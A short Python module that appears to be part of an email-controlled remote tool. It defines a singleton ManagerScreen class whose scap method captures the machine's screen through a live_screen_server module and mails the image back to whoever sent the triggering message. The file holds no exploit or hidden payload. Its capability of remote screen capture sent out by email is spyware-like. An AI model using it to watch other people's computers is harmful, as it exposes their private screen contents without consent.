import live_screen_server
class SingletonMeta(type):
    _instances = {}

    def __call__(self, *args, **kwargs):
        if self not in self._instances:
            instance = super().__call__(*args,**kwargs)
            self._instances[self] = instance
        return self._instances[self]


class ManagerScreen(metaclass=SingletonMeta):

    def __init__(self,email):
        self.mymail = email

    def scap(self,_callBack = None):
        rep = live_screen_server.capture_screenNow()
        if _callBack:
            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), rep)
        self.mymail.sendBack(rep,rep)